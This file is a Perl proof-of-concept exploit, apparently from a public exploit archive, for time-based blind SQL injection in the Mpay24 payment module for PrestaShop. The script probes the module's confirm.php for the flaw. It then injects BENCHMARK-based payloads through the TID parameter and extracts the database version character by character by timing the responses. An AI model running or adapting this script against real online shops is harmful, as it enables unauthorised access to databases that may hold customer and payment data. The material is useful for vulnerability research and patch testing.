#!/usr/bin/perl
# Exploit Title: Mpay24 prestashop payment module blind sqli PoC
# Exploit Author: Wireghoul
# Vendor Homepage: http://www.mpay24.com
# Written by @wireghoul - www.justanotherhacker.com

use strict;
use warnings;
use LWP::UserAgent;

if (!$ARGV[0]) {
    print "Usage $0 http://target.com/[path]\n";
    exit 1;
}

$ARGV[0] =~ s/\/+$//;
my $target = $ARGV[0].'/modules/mpay24/confirm.php';
my $ua = LWP::UserAgent->new();

# Can we reach the module ?
print "[*] Checking for the Mpay24 module\n";
my $check = $ua->get($target);
if (!$check->is_success) {
    print "[-] Unable to locate the Mpay24 module at $target\n";
    exit 1;
}
print "[+] Success!\n";

# Calculate the average response time of 3 page loads
my @lt = ();
my $max = 0;
for my $load (1..3) {
    my $preload = time;
    my $cnt = $ua->get($target);
    my $postload = time;
    $lt[$load] = $postload - $preload;
    if ($lt[$load] > $max) {
        $max = $lt[$load];
    }
    print "[!] Page load $load in $lt[$load] seconds\n";
}
my $avg = ($lt[1] + $lt[2] + $lt[3]) / 3;
print "[*] Load completed. Average load time: $avg, max: $max\n";

print "[*] Checking if url is vulnerable\n";
my $preload = time;
my $check2 = $ua->get("$target?MPAYTID=1&STATUS=bbb&TID=a' or 'a' in (select BENCHMARK(5000000,SHA1(0xDEADBEEF))); -- ");
my $postload = time;
my $lt = $postload - $preload;
if ($lt > $max) {
    print "[+] VULNERABLE - Extracting version number: ";
    my $version;
    for my $idx (1 .. 6) {
        for my $n (split //, '.0123456789') {
            $preload = time;
            my $sqlt = $ua->get("$target?MPAYTID=1&STATUS=bbb&TID=a'  or 'a' in (select IF(SUBSTR(\@\@version,$idx,1)='$n',BENCHMARK(5000000,SHA1(0xDEADBEEF)), false)); -- ");
            $postload = time;
            my $lt = $postload - $preload;
            if ($lt > $max) {
                $version.=$n;
                last;
            }
        }
    }
    print "$version...\n";
} else {
    print "[-] Not vulnerable\n";
}


